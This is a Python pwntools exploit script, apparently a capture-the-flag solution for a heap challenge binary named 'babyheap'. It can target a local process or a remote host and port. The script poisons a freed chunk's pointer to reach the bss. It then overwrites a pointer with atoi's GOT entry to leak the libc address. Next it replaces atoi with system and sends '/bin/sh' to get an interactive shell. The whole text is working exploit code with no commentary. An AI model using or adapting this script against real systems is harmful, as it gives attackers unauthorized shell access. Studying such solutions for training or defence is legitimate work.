#!/usr/bin/env python
from pwn import *
import sys

# context.terminal = ['tmux', 'split-window', '-h']
elf = ELF('./babyheap', checksec=False)

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = ELF('./libc.so.6', checksec=False)
else:
    # r = process('./babyheap')
    r = process('./babyheap_patch', aslr=False)
    libc = ELF('./libc.so.6', checksec=False)
    gdb.attach(r, 'b *0x400baf')

def fill(buf):
    r.sendlineafter('> ', '1337')
    r.sendafter('Fill ', buf)

def create():
    r.sendlineafter('> ', '1')

def edit(buf):
    r.sendlineafter('> ', '2')
    r.sendafter('Content? ', buf)

def show():
    r.sendlineafter('> ', '3')
    r.recvuntil('Content: ')
    return r.recvuntil('\n----', drop=True)

def delete():
    r.sendlineafter('> ', '4')

create()
delete()
edit(p64(elf.bss(0x20)))
create()

payload  = p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(elf.got['atoi'])
fill(payload)

libc.address = u64(show().ljust(8, '\x00')) - libc.symbols['atoi']

edit(p64(libc.symbols['system']))

r.sendlineafter('> ', '/bin/sh')

r.interactive()